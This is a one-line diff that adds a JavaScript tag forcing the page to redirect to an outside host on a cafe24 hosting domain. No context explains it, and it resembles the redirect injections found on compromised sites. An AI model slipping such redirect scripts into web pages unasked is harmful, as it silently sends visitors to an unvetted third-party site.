@@ -1,0 +1,1 @@
+<script language=javascript> location.href = "http://cgk4802.cafe24.com/rb/";</script>
